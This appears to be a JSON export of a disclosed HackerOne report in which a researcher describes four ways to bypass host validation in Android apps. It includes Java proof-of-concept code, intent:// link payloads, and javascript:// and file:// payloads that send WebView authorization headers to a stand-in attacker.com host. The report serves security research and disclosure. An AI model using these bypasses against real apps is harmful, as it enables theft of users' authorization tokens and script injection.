{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": true, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "samengmg", 
        "bobrov", 
        "europa", 
        "gerben_javado", 
        "0x9090", 
        "bogdantcaciuc", 
        "emitrani", 
        "exploitprotocol", 
        "theappsec", 
        "geekboy", 
        "and 55 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 431002, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Golden techniques to bypass host validations in Android apps", 
    "is_member_of_team?": null, 
    "vote_count": 65, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 11359, 
            "content": "# #1 Backslash tricks\nLook at a typical host validation\n```java\nUri uri = Uri.parse(attackerControlledString);\nif(\"legitimate.com\".equals(uri.getHost() || uri.getHost().endsWith(\".legitimate.com\")) {\n    webView.loadUrl(attackerControlledString, getAuthorizationHeaders()); // or webView.loadUrl(uri.toString())\n}\n```\n\nThere is a problem in ``` android.net.Uri ``` and ``` java.net.URL ``` parsers. They don't recognize backslashes in authority part (``` java.net.URI ``` will show an exception for that). If you test \n```java\nString url = \"http://attacker.com\\\\\\\\@legitimate.com/smth\";\nLog.d(\"Wow\", Uri.parse(url).getHost()); // legitimate.com is printed!\nwebView.loadUrl(url, getAuthorizationHeaders()); // attacker.com is loaded :P\n```\n\n# #2 Reflection\nHere is an example of a super-secure URL validation:\n```java\nUri uri = getIntent().getData();\nboolean isOurDomain = \"https\".equals(uri.getScheme()) && uri.getUserInfo() == null && \"legitimate.com\".equals(uri.getHost());\nif(isOurDomain) {\n    webView.load(uri.toString(), getAuthorizationHeaders());\n}\n```\n\n``` android.net.Uri ``` is widely used on the Android platform, but if you look at the source code, you will notice that there is an abstract class with a few internal subclasses! I found that custom URI with arbitrary parts could be built using ``` android.net.Uri$HierarchicalUri ```. Got the point already?\nCode in ``` MainActivity.java ```:\n```java\npublic class MainActivity extends Activity {\n\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        Uri uri;\n        try {\n            Class partClass = Class.forName(\"android.net.Uri$Part\");\n            Constructor partConstructor = partClass.getDeclaredConstructors()[0];\n            partConstructor.setAccessible(true);\n\n            Class pathPartClass = Class.forName(\"android.net.Uri$PathPart\");\n            Constructor pathPartConstructor = pathPartClass.getDeclaredConstructors()[0];\n            pathPartConstructor.setAccessible(true);\n\n            Class hierarchicalUriClass = Class.forName(\"android.net.Uri$HierarchicalUri\");\n            Constructor hierarchicalUriConstructor = hierarchicalUriClass.getDeclaredConstructors()[0];\n            hierarchicalUriConstructor.setAccessible(true);\n\n            Object authority = partConstructor.newInstance(\"legitimate.com\", \"legitimate.com\");\n            Object path = pathPartConstructor.newInstance(\"@attacker.com\", \"@attacker.com\");\n            uri = (Uri) hierarchicalUriConstructor.newInstance(\"https\", authority, path, null, null);\n        }\n        catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n\n        Intent intent = new Intent();\n        intent.setData(uri);\n        intent.setClass(this, TestActivity.class);\n        startActivity(intent);\n    }\n}\n```\n\nCode in ``` TestActivity.java ```:\n```java\npublic class TestActivity extends Activity {\n\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        Uri uri = getIntent().getData();\n        Log.d(\"Wow\", \"Scheme: \" + uri.getScheme());\n        Log.d(\"Wow\", \"UserInfo: \" + uri.getUserInfo());\n        Log.d(\"Wow\", \"Host: \" + uri.getHost());\n        Log.d(\"Wow\", \"toString(): \" + uri.toString());\n    }\n}\n```\n\nIn my case it displays:\n```\n10-30 06:02:20.142 32044 32044 D Wow     : Scheme: https\n10-30 06:02:20.142 32044 32044 D Wow     : UserInfo: null\n10-30 06:02:20.142 32044 32044 D Wow     : Host: legitimate.com\n10-30 06:02:20.142 32044 32044 D Wow     : toString(): https://legitimate.com@attacker.com\n```\n\nIt happens because apps parse URI only once, and a victim app doesn't parse it again, but trusts to \"already parsed\" URI received from untrusted sources\n\n# #3 Remote technique for #1\nAs you know, apps can automatically handle external links from browsers/messengers. This can be done by registering a special ``` intent-filter ```\n```xml\n\t<activity android:name=\".DeeplinkActivity\">\n\t    <intent-filter android:autoVerify=\"true\">\n\t        <action android:name=\"android.intent.action.VIEW\"/>\n\t        <category android:name=\"android.intent.category.DEFAULT\"/>\n\t        <category android:name=\"android.intent.category.BROWSABLE\"/>\n\t        <data android:scheme=\"https\" android:host=\"legitimate.com\"/>\n\t    </intent-filter>\n\t</activity>\n```\nAt this step you've already verified that you can attack that from third-party apps/ADB. If you try to create a remote PoC both to match the filter (remember that Android also uses ``` parsedIntent.getData().getHost() ``` to match with values defined in intent-filters) and triggers the bug\n```html\n<a href=\"https://attacker.com\\\\@legitimate.com/\">Begin zaheck!</a>\n```\nor\n\n```html\n<a href=\"https://attacker.com%5C%5C@legitimate.com/\">Begin zaheck!</a>\n```\nyou will notice that in the first example all ``` \\ ``` will be replaced with ``` / ```, in the second they will be kept encoded and the backslash trick won't work. But after careful research how ``` intent:// ``` scheme uries work I found a way to exploit it remotely. Intro: https://www.mbsd.jp/Whitepaper/IntentScheme.pdf\n\nAll backslashes could be saved in unchanged state in e.g. hash part of a URI right here https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6334\n\nPoC:\n```html\n<a href=\"intent://not_used/#Intent;scheme=https://attacker.com\\\\@legitimate.com/;end\">Begin zaheck!</a>\n```\nHere https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6436 it will be equal to\n```java\nUri.parse(\"https://attacker.com\\\\\\\\@legitimate.com/://not_used/\")\n```\nAnd the attack becomes remote!\n\n# #4 Missing scheme validation\nIn case if only the host value is validated, but the scheme isn't validated, you can use the following payloads with ``` javascript:// ``` and ``` file:// ``` scheme\n```\njavascript://legitimate.com/%0aalert(1)//\n```\nor\n```\nfile://legitimate.com/sdcard/payload.html\n```\n", 
            "content_html": "<h1 id=\"1-backslash-tricks\">#1 Backslash tricks</h1>\n\n<p>Look at a typical host validation</p>\n<pre class=\"highlight java\"><code><span class=\"n\">Uri</span> <span class=\"n\">uri</span> <span class=\"o\">=</span> <span class=\"n\">Uri</span><span class=\"o\">.</span><span class=\"na\">parse</span><span class=\"o\">(</span><span class=\"n\">attackerControlledString</span><span class=\"o\">);</span>\n<span class=\"k\">if</span><span class=\"o\">(</span><span class=\"s\">&quot;legitimate.com&quot;</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">uri</span><span class=\"o\">.</span><span class=\"na\">getHost</span><span class=\"o\">()</span> <span class=\"o\">||</span> <span class=\"n\">uri</span><span class=\"o\">.</span><span class=\"na\">getHost</span><span class=\"o\">().</span><span class=\"na\">endsWith</span><span class=\"o\">(</span><span class=\"s\">&quot;.legitimate.com&quot;</span><span class=\"o\">))</span> <span class=\"o\">{</span>\n    <span class=\"n\">webView</span><span class=\"o\">.</span><span class=\"na\">loadUrl</span><span class=\"o\">(</span><span class=\"n\">attackerControlledString</span><span class=\"o\">,</span> <span class=\"n\">getAuthorizationHeaders</span><span class=\"o\">());</span> <span class=\"c1\">// or webView.loadUrl(uri.toString())</span>\n<span class=\"o\">}</span>\n</code></pre>\n<p>There is a problem in <code>android.net.Uri</code> and <code>java.net.URL</code> parsers. They don&#39;t recognize backslashes in authority part (<code>java.net.URI</code> will show an exception for that). If you test </p>\n<pre class=\"highlight java\"><code><span class=\"n\">String</span> <span class=\"n\">url</span> <span class=\"o\">=</span> <span class=\"s\">&quot;http://attacker.com\\\\\\\\@legitimate.com/smth&quot;</span><span class=\"o\">;</span>\n<span class=\"n\">Log</span><span class=\"o\">.</span><span class=\"na\">d</span><span class=\"o\">(</span><span class=\"s\">&quot;Wow&quot;</span><span class=\"o\">,</span> <span class=\"n\">Uri</span><span class=\"o\">.</span><span class=\"na\">parse</span><span class=\"o\">(</span><span class=\"n\">url</span><span class=\"o\">).</span><span class=\"na\">getHost</span><span class=\"o\">());</span> <span class=\"c1\">// legitimate.com is printed!</span>\n<span class=\"n\">webView</span><span class=\"o\">.</span><span class=\"na\">loadUrl</span><span class=\"o\">(</span><span class=\"n\">url</span><span class=\"o\">,</span> <span class=\"n\">getAuthorizationHeaders</span><span class=\"o\">());</span> <span class=\"c1\">// attacker.com is loaded :P</span>\n</code></pre>\n<h1 id=\"2-reflection\">#2 Reflection</h1>\n\n<p>Here is an example of a super-secure URL validation:</p>\n<pre class=\"highlight java\"><code><span class=\"n\">Uri</span> <span class=\"n\">uri</span> <span class=\"o\">=</span> <span class=\"n\">getIntent</span><span class=\"o\">().</span><span class=\"na\">getData</span><span class=\"o\">();</span>\n<span class=\"kt\">boolean</span> <span class=\"n\">isOurDomain</span> <span class=\"o\">=</span> <span class=\"s\">&quot;https&quot;</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">uri</span><span class=\"o\">.</span><span class=\"na\">getScheme</span><span class=\"o\">())</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">uri</span><span class=\"o\">.</span><span class=\"na\">getUserInfo</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">&amp;&amp;</span> <span class=\"s\">&quot;legitimate.com&quot;</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">uri</span><span class=\"o\">.</span><span class=\"na\">getHost</span><span class=\"o\">());</span>\n<span class=\"k\">if</span><span class=\"o\">(</span><span class=\"n\">isOurDomain</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">webView</span><span class=\"o\">.</span><span class=\"na\">load</span><span class=\"o\">(</span><span class=\"n\">uri</span><span class=\"o\">.</span><span class=\"na\">toString</span><span class=\"o\">(),</span> <span class=\"n\">getAuthorizationHeaders</span><span class=\"o\">());</span>\n<span class=\"o\">}</span>\n</code></pre>\n<p><code>android.net.Uri</code> is widely used on the Android platform, but if you look at the source code, you will notice that there is an abstract class with a few internal subclasses! I found that custom URI with arbitrary parts could be built using <code>android.net.Uri$HierarchicalUri</code>. Got the point already?<br>\nCode in <code>MainActivity.java</code>:</p>\n<pre class=\"highlight java\"><code><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">MainActivity</span> <span class=\"kd\">extends</span> <span class=\"n\">Activity</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">protected</span> <span class=\"kt\">void</span> <span class=\"nf\">onCreate</span><span class=\"o\">(</span><span class=\"n\">Bundle</span> <span class=\"n\">savedInstanceState</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">onCreate</span><span class=\"o\">(</span><span class=\"n\">savedInstanceState</span><span class=\"o\">);</span>\n\n        <span class=\"n\">Uri</span> <span class=\"n\">uri</span><span class=\"o\">;</span>\n        <span class=\"k\">try</span> <span class=\"o\">{</span>\n            <span class=\"n\">Class</span> <span class=\"n\">partClass</span> <span class=\"o\">=</span> <span class=\"n\">Class</span><span class=\"o\">.</span><span class=\"na\">forName</span><span class=\"o\">(</span><span class=\"s\">&quot;android.net.Uri$Part&quot;</span><span class=\"o\">);</span>\n            <span class=\"n\">Constructor</span> <span class=\"n\">partConstructor</span> <span class=\"o\">=</span> <span class=\"n\">partClass</span><span class=\"o\">.</span><span class=\"na\">getDeclaredConstructors</span><span class=\"o\">()[</span><span class=\"mi\">0</span><span class=\"o\">];</span>\n            <span class=\"n\">partConstructor</span><span class=\"o\">.</span><span class=\"na\">setAccessible</span><span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">);</span>\n\n            <span class=\"n\">Class</span> <span class=\"n\">pathPartClass</span> <span class=\"o\">=</span> <span class=\"n\">Class</span><span class=\"o\">.</span><span class=\"na\">forName</span><span class=\"o\">(</span><span class=\"s\">&quot;android.net.Uri$PathPart&quot;</span><span class=\"o\">);</span>\n            <span class=\"n\">Constructor</span> <span class=\"n\">pathPartConstructor</span> <span class=\"o\">=</span> <span class=\"n\">pathPartClass</span><span class=\"o\">.</span><span class=\"na\">getDeclaredConstructors</span><span class=\"o\">()[</span><span class=\"mi\">0</span><span class=\"o\">];</span>\n            <span class=\"n\">pathPartConstructor</span><span class=\"o\">.</span><span class=\"na\">setAccessible</span><span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">);</span>\n\n            <span class=\"n\">Class</span> <span class=\"n\">hierarchicalUriClass</span> <span class=\"o\">=</span> <span class=\"n\">Class</span><span class=\"o\">.</span><span class=\"na\">forName</span><span class=\"o\">(</span><span class=\"s\">&quot;android.net.Uri$HierarchicalUri&quot;</span><span class=\"o\">);</span>\n            <span class=\"n\">Constructor</span> <span class=\"n\">hierarchicalUriConstructor</span> <span class=\"o\">=</span> <span class=\"n\">hierarchicalUriClass</span><span class=\"o\">.</span><span class=\"na\">getDeclaredConstructors</span><span class=\"o\">()[</span><span class=\"mi\">0</span><span class=\"o\">];</span>\n            <span class=\"n\">hierarchicalUriConstructor</span><span class=\"o\">.</span><span class=\"na\">setAccessible</span><span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">);</span>\n\n            <span class=\"n\">Object</span> <span class=\"n\">authority</span> <span class=\"o\">=</span> <span class=\"n\">partConstructor</span><span class=\"o\">.</span><span class=\"na\">newInstance</span><span class=\"o\">(</span><span class=\"s\">&quot;legitimate.com&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;legitimate.com&quot;</span><span class=\"o\">);</span>\n            <span class=\"n\">Object</span> <span class=\"n\">path</span> <span class=\"o\">=</span> <span class=\"n\">pathPartConstructor</span><span class=\"o\">.</span><span class=\"na\">newInstance</span><span class=\"o\">(</span><span class=\"s\">&quot;@attacker.com&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;@attacker.com&quot;</span><span class=\"o\">);</span>\n            <span class=\"n\">uri</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">Uri</span><span class=\"o\">)</span> <span class=\"n\">hierarchicalUriConstructor</span><span class=\"o\">.</span><span class=\"na\">newInstance</span><span class=\"o\">(</span><span class=\"s\">&quot;https&quot;</span><span class=\"o\">,</span> <span class=\"n\">authority</span><span class=\"o\">,</span> <span class=\"n\">path</span><span class=\"o\">,</span> <span class=\"kc\">null</span><span class=\"o\">,</span> <span class=\"kc\">null</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">Exception</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"nf\">RuntimeException</span><span class=\"o\">(</span><span class=\"n\">e</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n\n        <span class=\"n\">Intent</span> <span class=\"n\">intent</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Intent</span><span class=\"o\">();</span>\n        <span class=\"n\">intent</span><span class=\"o\">.</span><span class=\"na\">setData</span><span class=\"o\">(</span><span class=\"n\">uri</span><span class=\"o\">);</span>\n        <span class=\"n\">intent</span><span class=\"o\">.</span><span class=\"na\">setClass</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">,</span> <span class=\"n\">TestActivity</span><span class=\"o\">.</span><span class=\"na\">class</span><span class=\"o\">);</span>\n        <span class=\"n\">startActivity</span><span class=\"o\">(</span><span class=\"n\">intent</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n</code></pre>\n<p>Code in <code>TestActivity.java</code>:</p>\n<pre class=\"highlight java\"><code><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">TestActivity</span> <span class=\"kd\">extends</span> <span class=\"n\">Activity</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">protected</span> <span class=\"kt\">void</span> <span class=\"nf\">onCreate</span><span class=\"o\">(</span><span class=\"n\">Bundle</span> <span class=\"n\">savedInstanceState</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">onCreate</span><span class=\"o\">(</span><span class=\"n\">savedInstanceState</span><span class=\"o\">);</span>\n\n        <span class=\"n\">Uri</span> <span class=\"n\">uri</span> <span class=\"o\">=</span> <span class=\"n\">getIntent</span><span class=\"o\">().</span><span class=\"na\">getData</span><span class=\"o\">();</span>\n        <span class=\"n\">Log</span><span class=\"o\">.</span><span class=\"na\">d</span><span class=\"o\">(</span><span class=\"s\">&quot;Wow&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;Scheme: &quot;</span> <span class=\"o\">+</span> <span class=\"n\">uri</span><span class=\"o\">.</span><span class=\"na\">getScheme</span><span class=\"o\">());</span>\n        <span class=\"n\">Log</span><span class=\"o\">.</span><span class=\"na\">d</span><span class=\"o\">(</span><span class=\"s\">&quot;Wow&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;UserInfo: &quot;</span> <span class=\"o\">+</span> <span class=\"n\">uri</span><span class=\"o\">.</span><span class=\"na\">getUserInfo</span><span class=\"o\">());</span>\n        <span class=\"n\">Log</span><span class=\"o\">.</span><span class=\"na\">d</span><span class=\"o\">(</span><span class=\"s\">&quot;Wow&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;Host: &quot;</span> <span class=\"o\">+</span> <span class=\"n\">uri</span><span class=\"o\">.</span><span class=\"na\">getHost</span><span class=\"o\">());</span>\n        <span class=\"n\">Log</span><span class=\"o\">.</span><span class=\"na\">d</span><span class=\"o\">(</span><span class=\"s\">&quot;Wow&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;toString(): &quot;</span> <span class=\"o\">+</span> <span class=\"n\">uri</span><span class=\"o\">.</span><span class=\"na\">toString</span><span class=\"o\">());</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n</code></pre>\n<p>In my case it displays:</p>\n<pre class=\"highlight plaintext\"><code>10-30 06:02:20.142 32044 32044 D Wow     : Scheme: https\n10-30 06:02:20.142 32044 32044 D Wow     : UserInfo: null\n10-30 06:02:20.142 32044 32044 D Wow     : Host: legitimate.com\n10-30 06:02:20.142 32044 32044 D Wow     : toString(): https://legitimate.com@attacker.com\n</code></pre>\n<p>It happens because apps parse URI only once, and a victim app doesn&#39;t parse it again, but trusts to &quot;already parsed&quot; URI received from untrusted sources</p>\n\n<h1 id=\"3-remote-technique-for-1\">#3 Remote technique for #1</h1>\n\n<p>As you know, apps can automatically handle external links from browsers/messengers. This can be done by registering a special <code>intent-filter</code></p>\n<pre class=\"highlight xml\"><code>    <span class=\"nt\">&lt;activity</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;.DeeplinkActivity&quot;</span><span class=\"nt\">&gt;</span>\n        <span class=\"nt\">&lt;intent-filter</span> <span class=\"na\">android:autoVerify=</span><span class=\"s\">&quot;true&quot;</span><span class=\"nt\">&gt;</span>\n            <span class=\"nt\">&lt;action</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.action.VIEW&quot;</span><span class=\"nt\">/&gt;</span>\n            <span class=\"nt\">&lt;category</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.category.DEFAULT&quot;</span><span class=\"nt\">/&gt;</span>\n            <span class=\"nt\">&lt;category</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.category.BROWSABLE&quot;</span><span class=\"nt\">/&gt;</span>\n            <span class=\"nt\">&lt;data</span> <span class=\"na\">android:scheme=</span><span class=\"s\">&quot;https&quot;</span> <span class=\"na\">android:host=</span><span class=\"s\">&quot;legitimate.com&quot;</span><span class=\"nt\">/&gt;</span>\n        <span class=\"nt\">&lt;/intent-filter&gt;</span>\n    <span class=\"nt\">&lt;/activity&gt;</span>\n</code></pre>\n<p>At this step you&#39;ve already verified that you can attack that from third-party apps/ADB. If you try to create a remote PoC both to match the filter (remember that Android also uses <code>parsedIntent.getData().getHost()</code> to match with values defined in intent-filters) and triggers the bug</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;https://attacker.com\\\\@legitimate.com/&quot;</span><span class=\"nt\">&gt;</span>Begin zaheck!<span class=\"nt\">&lt;/a&gt;</span>\n</code></pre>\n<p>or</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;https://attacker.com%5C%5C@legitimate.com/&quot;</span><span class=\"nt\">&gt;</span>Begin zaheck!<span class=\"nt\">&lt;/a&gt;</span>\n</code></pre>\n<p>you will notice that in the first example all <code>\\</code> will be replaced with <code>/</code>, in the second they will be kept encoded and the backslash trick won&#39;t work. But after careful research how <code>intent://</code> scheme uries work I found a way to exploit it remotely. Intro: <a title=\"https://www.mbsd.jp/Whitepaper/IntentScheme.pdf\" href=\"/redirect?signature=abce1fc3d073f316263955dc21fd7dce65bb8edf&amp;url=https%3A%2F%2Fwww.mbsd.jp%2FWhitepaper%2FIntentScheme.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.mbsd.jp/Whitepaper/IntentScheme.pdf</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>All backslashes could be saved in unchanged state in e.g. hash part of a URI right here <a title=\"https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6334\" href=\"/redirect?signature=71735acdfb5134f5add5f5b183369f9bd36c3a6e&amp;url=https%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fframeworks%2Fbase%2F%2B%2F568faa8ed90d965faf302ca60677a40a5b84bf86%2Fcore%2Fjava%2Fandroid%2Fcontent%2FIntent.java%236334\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6334</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>PoC:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;intent://not_used/#Intent;scheme=https://attacker.com\\\\@legitimate.com/;end&quot;</span><span class=\"nt\">&gt;</span>Begin zaheck!<span class=\"nt\">&lt;/a&gt;</span>\n</code></pre>\n<p>Here <a title=\"https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6436\" href=\"/redirect?signature=e9fc759af32db0bc7678daac432ee2fab8835e0a&amp;url=https%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fframeworks%2Fbase%2F%2B%2F568faa8ed90d965faf302ca60677a40a5b84bf86%2Fcore%2Fjava%2Fandroid%2Fcontent%2FIntent.java%236436\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://android.googlesource.com/platform/frameworks/base/+/568faa8ed90d965faf302ca60677a40a5b84bf86/core/java/android/content/Intent.java#6436</span><i class=\"icon-external-link\"></i></a> it will be equal to</p>\n<pre class=\"highlight java\"><code><span class=\"n\">Uri</span><span class=\"o\">.</span><span class=\"na\">parse</span><span class=\"o\">(</span><span class=\"s\">&quot;https://attacker.com\\\\\\\\@legitimate.com/://not_used/&quot;</span><span class=\"o\">)</span>\n</code></pre>\n<p>And the attack becomes remote!</p>\n\n<h1 id=\"4-missing-scheme-validation\">#4 Missing scheme validation</h1>\n\n<p>In case if only the host value is validated, but the scheme isn&#39;t validated, you can use the following payloads with <code>javascript://</code> and <code>file://</code> scheme</p>\n<pre class=\"highlight plaintext\"><code>javascript://legitimate.com/%0aalert(1)//\n</code></pre>\n<p>or</p>\n<pre class=\"highlight plaintext\"><code>file://legitimate.com/sdcard/payload.html\n</code></pre>"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "reporter": {
                "username": "bagipro", 
                "url": "/bagipro"
            }, 
            "created_at": "2018-10-30T17:38:29.617Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-30T17:38:29.617Z", 
            "actor": {
                "username": "bagipro", 
                "url": "/bagipro", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "redact", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 3556758, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-10-30T19:35:37.408Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-10-30T19:35:37.408Z", 
            "actor": {
                "username": "bagipro", 
                "url": "/bagipro", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "redact", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 3556839, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "bagipro", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/bagipro", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/052/239/4da99970bfc1e4897f003883d05dc8acfec556ef_small.jpg?1510530490"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2018-10-30T19:35:37.364Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/431002", 
    "created_at": "2018-10-30T17:38:29.617Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Guys, there is an amazing Russian word &quot;zaheck&quot; which is a synonym to vulnerability, trick, vector or attack. You need to begin using it to make us happy!</p>\n", 
    "vulnerability_information": "Guys, there is an amazing Russian word \"zaheck\" which is a synonym to vulnerability, trick, vector or attack. You need to begin using it to make us happy!", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "", 
            "about": "\u2588\u2588\u2588\u2588\u2588\u2588 ", 
            "twitter_handle": "", 
            "name": "\u2588\u2588\u2588\u2588\u2588\u2588"
        }, 
        "handle": "redact", 
        "url": "https://hackerone.com/redact", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/031/807/95ebe78033c1c02be7d5e895da313a8a6fbb9074_small.jpg?1534322548", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/031/807/893b0d30cb5c5e9bc1b97743f8a7b122d8e7ecf7_medium.jpg?1534322548"
        }, 
        "id": 31807, 
        "permissions": []
    }, 
    "is_published": true
}